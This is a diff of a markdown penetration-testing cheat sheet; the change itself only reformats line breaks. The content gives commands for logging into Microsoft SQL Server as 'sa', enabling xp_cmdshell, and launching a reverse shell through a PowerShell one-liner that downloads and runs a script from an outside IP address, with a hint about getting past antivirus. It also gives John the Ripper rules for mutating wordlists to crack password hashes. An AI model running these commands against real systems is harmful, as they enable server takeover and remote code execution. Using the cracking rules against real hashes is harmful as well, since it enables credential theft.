@@ -22,24 +22,24 @@
 `sqsh -U sa -S <ip>:<port>`
 
 ### test xp cmdshell
-`xp_cmdshell 'whoami'`
-`go`
+`xp_cmdshell 'whoami'`  
+`go`  
 
 ### if necessary, enable xp_cmdshell
-`EXEC SP_CONFIGURE 'show advanced options',1`
-`reconfigure`
-`go`
+`EXEC SP_CONFIGURE 'show advanced options',1`  
+`reconfigure`  
+`go`  
 
 
-`EXEC SP_CONFIGURE 'xp_cmdshell',1`
-`reconfigure`
-`go`
+`EXEC SP_CONFIGURE 'xp_cmdshell',1`  
+`reconfigure`  
+`go`  
 
 ### Rev shell options 
 #### Will be tough if AV is running, try surveying system from here to find a better access method
 
-`xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring('http://1.1.1.2/rev.ps1')"`
-`go`
+`xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring('http://1.1.1.2/rev.ps1')"`  
+`go`  
 
 can also try certutil or powershell wget (if newish PSVersion)
 
@@ -48,22 +48,19 @@ can also try certutil or powershell wget (if newish PSVersion)
 ## John Wordlist Mutation
 
 ### Will use Wordlist mode rules from /etc/john/john.conf
-`john --rules --wordlist=wordlist.txt hashes.txt`
-
-`john --rules --stdout --wordlist=wordlist.txt > mutated_wordlist.txt`
+`john --rules --wordlist=wordlist.txt hashes.txt`  
+`john --rules --stdout --wordlist=wordlist.txt > mutated_wordlist.txt`  
 
 
 ## John Wordlist Rules
 
-`[List.Rules:Wordlist]`
-
-`$[0-9]`
-
-`$[0-9]$[0-9]`
-`cAz"[0-9]"`
-`cAz"[0-9][0-9]"`
-`cAz"[£!$]"`
-`cAz"[0-9][£!$]"`
+`[List.Rules:Wordlist]`  
+`$[0-9]`  
+`$[0-9]$[0-9]`  
+`cAz"[0-9]"`  
+`cAz"[0-9][0-9]"`  
+`cAz"[£!$]"`  
+`cAz"[0-9][£!$]"`  
 
 #### or add to a custom rules list like [List.Rules:MyRule]
 `john --rules=MyRule --wordlist=wordlist.txt hashes.txt`
